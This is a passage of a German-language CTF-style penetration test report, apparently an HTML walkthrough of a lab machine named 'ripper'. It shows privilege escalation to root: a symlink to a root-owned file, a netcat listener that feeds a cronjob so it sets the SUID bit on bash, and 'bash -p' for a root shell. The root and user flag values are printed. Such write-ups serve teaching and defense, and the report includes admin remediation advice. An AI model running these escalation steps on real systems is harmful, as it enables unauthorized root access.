+helder@ripper:~$ <span class="command">ls -al</span>
+total 32
+drwx------ 3 helder helder 4096 Oct 12 10:21 .
+drwxr-xr-x 4 root   root   4096 May 26  2021 ..
+lrwxrwxrwx 1 root   root      9 May 26  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 helder helder  220 May 26  2021 .bash_logout
+-rw-r--r-- 1 helder helder 3659 May 26  2021 .bashrc
+drwxr-xr-x 3 helder helder 4096 May 26  2021 .local
+lrwxrwxrwx 1 helder helder   23 Oct 12 10:21 passwd.txt -> /root/.local/helder.txt <!-- Symlink erstellt -->
+-rw-r--r-- 1 helder helder  940 May 26  2021 .profile
+-rwx------ 1 helder helder   33 May 26  2021 user.txt
+-rw------- 1 helder helder   52 May 26  2021 .Xauthority
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 10000 gestartet, und der String `bash` wird gesendet, sobald eine Verbindung eingeht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekter Schritt, um dem Cronjob den Namen des Ziel-Binaries zu übermitteln.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Warte, bis der Cronjob verbindet und läuft (max. 1 Minute). Überprüfe dann die Berechtigungen von `/usr/bin/bash`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+helder@ripper:~$ <span class="command">echo 'bash' | nc -lvnp 10000</span>
+listening on [any] 10000 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50148 <!-- Cronjob hat verbunden -->
+<!-- 'bash' wurde gesendet -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Cronjob-Lauf werden die Berechtigungen von `/usr/bin/bash` geprüft.</p>
+            <p class="evaluation"><strong>Bewertung: !!SUID-Bit gesetzt!!** Die Berechtigungen sind nun `-rwsr-sr-x`. Der Cronjob hat erfolgreich das SUID-Bit auf `/usr/bin/bash` gesetzt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe `bash -p` aus.<br><strong>Empfehlung (Admin):</strong> Korrigiere den Cronjob.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+helder@ripper:~$ <span class="command">ls -al /usr/bin/bash</span>
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /usr/bin/bash <!-- SUID Bit! -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `bash -p` wird ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Die Option `-p` bewirkt, dass Bash die effektiven Rechte (euid=0, egid=0) beibehält, die es durch das SUID/SGID-Bit erhalten hat. Der `id`-Befehl bestätigt den Root-Zugriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lese die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne den unsicheren Cronjob und setze die Berechtigungen von `/usr/bin/bash` zurück (`chmod u-s,g-s /usr/bin/bash`).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+helder@ripper:~$ <span class="command">bash -p</span>
+bash-5.0# <span class="command">id</span> <!-- Prompt ändert sich und id bestätigt root -->
+uid=1001(helder) gid=1001(helder) euid=0(root) egid=0(root) groups=0(root),1001(helder)
+bash-5.0# <!-- Root-Shell -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Root wird die Root-Flag gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Root-Flag `<span class="password">e28f578a17a5f99c0381c4b689d96f9f</span>` erfolgreich gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+bash-5.0# <span class="command">cd /root/</span>
+bash-5.0# <span class="command">cat root.txt</span>
+<span class="password">e28f578a17a5f99c0381c4b689d96f9f</span>
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">e28f578a17a5f99c0381c4b689d96f9f</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/helder/user.txt</div> <!-- Pfad hinzugefügt -->
+                     <div class="flag-value"><span class="password">5c38d7d08c687355cb0ae3b6025cbe99</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan extrahiert -->
+        <p>Berichtsdatum: 12. Oktober 2022</p>
+    </footer>
+</body>
+</html>
